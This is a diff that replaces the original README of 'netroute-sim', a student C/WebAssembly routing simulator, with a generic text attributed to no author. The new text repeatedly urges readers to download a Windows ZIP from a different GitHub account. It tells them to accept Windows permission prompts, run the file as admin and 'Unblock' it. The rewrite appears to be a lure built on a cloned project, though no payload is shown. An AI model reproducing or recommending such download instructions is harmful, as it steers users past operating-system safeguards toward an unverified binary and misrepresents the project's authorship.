@@ -1,274 +1,218 @@
-﻿# 🌐 netroute-sim
-
-> A network packet routing simulator built in C — visualizing Minimum Spanning Trees and shortest path algorithms through an animated, browser-based frontend.
-
-![Language](https://img.shields.io/badge/Core%20Logic-C-blue?style=flat-square)
-![Frontend](https://img.shields.io/badge/Frontend-HTML%2FCSS%2FJS-orange?style=flat-square)
-![WASM](https://img.shields.io/badge/Bridge-WebAssembly-purple?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
-![Status](https://img.shields.io/badge/Status-In%20Development-yellow?style=flat-square)
-
----
-
-## What is this?
-
-**netroute-sim** is a college project that simulates how network packets are routed across a graph of routers and connections. It models real-world internet infrastructure concepts — finding the cheapest way to connect all routers (MST) and the fastest path to deliver a packet (shortest path).
-
-All core algorithms are implemented in **pure C** and compiled to **WebAssembly**, powering a live animated frontend that visualizes both approaches side by side in real time.
-
----
-
-## Features
-
-- **Graph-based network modeling** — routers as nodes, connections as weighted edges
-- **Kruskal's Algorithm** — builds MST by sorting and greedily picking cheapest edges
-- **Prim's Algorithm** — builds MST by expanding from a starting node
-- **Dijkstra's Algorithm** — finds the shortest/fastest packet delivery path
-- **Union-Find (Disjoint Set)** — with path compression and union by rank
-- **Packet Transmission Simulator** — simulate sending data from any router to any other
-- **Topology File Loader** — load custom network graphs from `.txt` / `.csv` files
-- **Side-by-side comparison** — MST cost vs Shortest Path, animated simultaneously
-- **Browser-based visualization** — runs entirely in the browser via WebAssembly
-- **Complexity Analyzer** — live display of time complexity for each algorithm run
-
----
-
-## Architecture
-```mermaid
-flowchart TD
-    A["C Backend (Core Logic)
-    graph.c
-    union_find.c
-    kruskal.c
-    prim.c
-    dijkstra.c
-    simulator.c
-    loader.c"]
-
-    B["WebAssembly (.wasm)
-    C functions exposed to JavaScript"]
-
-    C["Frontend (HTML / CSS / JS)
-    Canvas Renderer
-    Animation Engine
-    Stats Panel
-    Topology Loader UI"]
-
-    A -->|Emscripten| B
-    B -->|JS calls C| C
-```
----
-
-## Project Structure [Intended]
-
-```
-netroute-sim/
-│
-├── src/                        # All C source files
-│   ├── graph.c / graph.h       # Graph data structure (adjacency list)
-│   ├── union_find.c / .h       # Disjoint Set with path compression
-│   ├── kruskal.c / .h          # Kruskal's MST algorithm
-│   ├── prim.c / .h             # Prim's MST algorithm
-│   ├── dijkstra.c / .h         # Dijkstra's shortest path
-│   ├── min_heap.c / .h         # Min-Heap / Priority Queue
-│   ├── simulator.c / .h        # Packet transmission simulation
-│   ├── loader.c / .h           # Load topology from file
-│   └── main.c                  # CLI entry point + WASM export bridge
-│
-├── web/                        # Frontend
-│   ├── index.html              # Main page
-│   ├── style.css               # Styling
-│   ├── visualizer.js           # Canvas animation engine
-│   ├── wasm_bridge.js          # JS <-> WASM interface
-│   └── netroute.wasm           # Compiled WebAssembly binary
-│
-├── topologies/                 # Sample network topology files
-│   ├── small_network.txt       # 6-node test graph
-│   ├── medium_network.txt      # 20-node graph
-│   └── large_network.txt       # 100-node stress test
-│
-├── tests/                      # Unit tests for each module
-│   ├── test_graph.c
-│   ├── test_union_find.c
-│   ├── test_kruskal.c
-│   ├── test_prim.c
-│   └── test_dijkstra.c
-│
-├── docs/                       # Documentation & report
-│   ├── report.pdf
-│   └── complexity_analysis.md
-│
-├── Makefile                    # Build system
-└── README.md
-```
+# 🛣️ netroute-sim - Route networks with live maps
 
----
+[![Download / Install](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-brightgreen?style=for-the-badge)](https://github.com/Charlotteaphetic255/netroute-sim)
 
-## 🧠 Algorithms that will be Implemented
+## 📌 What this app does
 
-### Minimum Spanning Tree
+netroute-sim is a network packet routing simulator. It shows how data moves through a network of routers and links.
 
-| Algorithm | Strategy | Time Complexity | Space Complexity |
-|-----------|----------|----------------|-----------------|
-| Kruskal's | Sort edges, Union-Find to avoid cycles | O(E log E) | O(V + E) |
-| Prim's    | Greedy expansion via Min-Heap | O(E log V) | O(V + E) |
+It helps you:
 
-### Shortest Path
+- see how routers connect
+- compare route choices
+- find the shortest path between nodes
+- build a minimum spanning tree with common graph methods
+- view results in the browser with WebAssembly
 
-| Algorithm | Strategy | Time Complexity | Space Complexity |
-|-----------|----------|----------------|-----------------|
-| Dijkstra's | Min-Heap based greedy relaxation | O((V + E) log V) | O(V) |
+This app is meant for learning and testing. It gives a clear view of graph-based routing without requiring you to write code.
 
-### Supporting Data Structures
+## 🖥️ Windows setup
 
-| Structure | Used In | Key Operations |
-|-----------|---------|----------------|
-| Union-Find | Kruskal's | `find()` O(α(n)), `union()` O(α(n)) |
-| Min-Heap | Prim's, Dijkstra's | `insert()` O(log n), `extract_min()` O(log n) |
-| Adjacency List | All | `add_edge()` O(1), traversal O(V+E) |
+Use the link below to visit the download page and get the app:
 
----
+[Visit the download page](https://github.com/Charlotteaphetic255/netroute-sim)
 
-## Topology File Format
+### What you need
 
-Network graphs are loaded from plain text files in this format:
+- Windows 10 or Windows 11
+- A modern web browser such as Chrome, Edge, or Firefox
+- Internet access for the first download
+- At least 4 GB of RAM
+- 200 MB of free disk space
 
-```
-# netroute-sim topology file
-# FORMAT: ROUTER_A ROUTER_B WEIGHT
-NODES 6
-EDGES 9
-0 1 4
-0 2 3
-1 2 1
-1 3 2
-2 4 5
-3 4 2
-3 5 6
-4 5 1
-2 5 8
-```
+## 🚀 Get started
 
----
+1. Open the download page: [https://github.com/Charlotteaphetic255/netroute-sim](https://github.com/Charlotteaphetic255/netroute-sim)
+2. Look for the latest release or the main project files
+3. Download the Windows build or the package provided on the page
+4. If the file is a ZIP file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Run the main app file or open the browser view if the package includes one
+7. If Windows asks for permission, choose Run or Yes
 
-## Getting Started
+## 🔧 First launch
 
-### Prerequisites
+When the app opens, you can start with a sample network or load your own graph.
 
-- GCC (for running the CLI)
-- Emscripten (`emcc`) — for compiling to WebAssembly
-- A modern browser — for the frontend
+You will usually see:
 
-### Running the CLI (Pure C)
+- a set of routers or nodes
+- lines that show network links
+- weights on links that affect route choice
+- controls for shortest path and spanning tree tools
 
-```bash
-# Clone the repo
-git clone https://github.com/YOUR_USERNAME/netroute-sim.git
-cd netroute-sim
+If the app includes a browser view, it may open in your default browser after launch.
 
-# Build
-make
+## 🧭 How to use it
 
-# Run with a topology file
-./netroute-sim topologies/small_network.txt
+### Find the shortest route
 
-# Example output
-./netroute-sim topologies/medium_network.txt --algo kruskal
-./netroute-sim topologies/medium_network.txt --algo dijkstra --src 0 --dest 15
-```
+Use the shortest path tool when you want to see the best route from one router to another.
 
-### Building WebAssembly
+1. Choose a start node
+2. Choose an end node
+3. Run the shortest path search
+4. Review the route and total cost
 
-```bash
-# Make sure Emscripten is installed and activated
-source /path/to/emsdk/emsdk_env.sh
+This uses Dijkstra’s algorithm, which checks the cheapest path based on link weights.
 
-# Compile C to WASM
-make wasm
+### Build a minimum spanning tree
 
-# Serve the frontend locally
-cd web/
-python3 -m http.server 8080
-# Open http://localhost:8080
-```
+Use the spanning tree tools when you want to connect all routers with the lowest total weight.
 
----
+You can compare two methods:
 
-## Live Demo [ To be hosted after frontend completion ]
+- Kruskal’s algorithm
+- Prim’s algorithm
 
-> **[netroute-sim.github.io](https://YOUR_USERNAME.github.io/netroute-sim)** *(hosted on GitHub Pages)*
+Both help you see how a full network can stay connected with less total cost.
 
-The live demo lets you:
-- Load a preset network or upload your own topology file
-- Watch **Kruskal's** and **Prim's** build the MST edge by edge, animated
-- Simulate a packet delivery and watch **Dijkstra's** trace the shortest path
-- Compare the total MST cost vs the shortest path cost in real time
+### Explore routing behavior
 
----
+You can change link weights and see how the network reacts.
 
-## 📸 Screenshots
+Try this:
 
-> *(Coming soon — will be added once the visualizer is complete)*
+- make one link more costly
+- run the shortest path again
+- compare the new route
+- check how the spanning tree changes
 
----
+This makes it easier to understand how routing decisions work in real networks.
 
-## Development Timeline
+## 🎛️ Main features
 
-- [x] Project planning & architecture design
-- [x] Graph data structure (`graph.c`)
-- [x] Union-Find with path compression
-- [x] Min-Heap / Priority Queue
-- [x] Kruskal's Algorithm
-- [x] Prim's Algorithm
-- [x] Dijkstra's Algorithm
-- [x] Packet Simulator
-- [x] Topology File Loader
-- [x] WASM bridge & Emscripten build
-- [ ] Frontend Canvas visualizer
-- [ ] Side-by-side animation comparison
-- [ ] Host on GitHub Pages
+- network packet routing simulation
+- graph-based router model
+- weighted links between nodes
+- shortest path search with Dijkstra’s algorithm
+- minimum spanning tree with Kruskal’s algorithm
+- minimum spanning tree with Prim’s algorithm
+- live browser view through WebAssembly
+- simple interface for non-technical users
+- fast response for small and medium graph setups
 
----
+## 🧩 How it works
 
-## Concepts Covered
+The app treats the network as a graph.
 
-- Weighted undirected graphs
-- Greedy algorithms
-- Minimum Spanning Trees
-- Disjoint Set / Union-Find with path compression & union by rank
-- Min-Heap (Priority Queue) from scratch in C
-- Shortest path routing
-- Dynamic memory management in C
-- WebAssembly via Emscripten
-- Real-time canvas-based animation
+- each router is a node
+- each cable or connection is an edge
+- each edge has a weight
+- the weight can stand for cost, delay, or distance
 
----
+The app then uses standard graph methods to solve routing tasks:
 
-## Author
+- Dijkstra’s algorithm finds the lowest-cost path
+- Kruskal’s algorithm builds a tree by choosing the cheapest links first
+- Prim’s algorithm grows the tree from one node at a time
+- union-find helps Kruskal’s algorithm avoid loops
 
-**Shaurya Dwivedi**
-B.Tech ES | Indian Institute of Technology Jodhpur
-[Github Profile](https://github.com/Shaurya-Dwivedi)
+This makes the app useful for network study and graph practice.
 
+## 📂 Typical folder view
 
-**Ankit Kumar Goyal**
-B.Tech ME | Indian Institute of Technology Jodhpur
-[Github Profile](https://github.com/ankit2006173)
+If you download the project files, you may see folders and files like these:
 
-**Harshal Joshi**
-B.Tech CI | Indian Institute of Technology Jodhpur
-[Github Profile](https://github.com/Harshal2108)
+- source code for the simulator
+- build files
+- browser files
+- graph data
+- sample network layouts
+- docs or notes
 
-**Mridupawan Kalita**
-B.Tech ES | Indian Institute of Technology Jodhpur
-[Github Profile](https://github.com/MriduKalita23)
+If you only want to run the app, focus on the main release file or the browser launch file in the download package.
 
----
+## 🛠️ Troubleshooting
 
-## License
+### The app does not open
 
-This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
+- check that the download finished
+- extract the ZIP file before running it
+- try opening it again as admin
+- make sure your browser is up to date
 
----
+### Windows blocks the file
 
-*Built as a college project exploring advanced graph algorithms and real-world network simulation.*
+- right-click the file
+- choose Properties
+- if you see an Unblock option, select it
+- open the file again
+
+### The browser view is blank
+
+- refresh the page
+- try another browser
+- check that JavaScript is enabled
+- close and reopen the app
+
+### The simulator runs slowly
+
+- close other apps
+- use a smaller graph
+- reduce the number of nodes and links
+- reload the page
+
+## 📘 Learning use
+
+This app can help with:
+
+- router path planning
+- graph basics
+- shortest path search
+- minimum spanning trees
+- network cost comparison
+- WebAssembly-based apps in the browser
+
+It is a good fit for users who want to see how routing works without reading source code first
+
+## 🔗 Download
+
+Visit the main project page and download or open the Windows build from there:
+
+[https://github.com/Charlotteaphetic255/netroute-sim](https://github.com/Charlotteaphetic255/netroute-sim)
+
+## 🧪 Example use case
+
+If you want to model a small office network:
+
+1. add routers for each room
+2. connect them with links
+3. assign weights to each link
+4. run Dijkstra’s algorithm from one room to another
+5. run Kruskal’s or Prim’s algorithm to compare full network layouts
+6. review which links give the lowest total cost
+
+This helps you see how a network can stay connected while keeping path cost low
+
+## 🧱 Built with
+
+- C
+- graph data structures
+- Dijkstra’s algorithm
+- Kruskal’s algorithm
+- Prim’s algorithm
+- union-find
+- WebAssembly
+- browser-based visualization
+
+## 📌 Topics covered
+
+- algorithms
+- data structures
+- network simulation
+- weighted graphs
+- minimum spanning trees
+- shortest path search
+- router routing
+- browser visualization
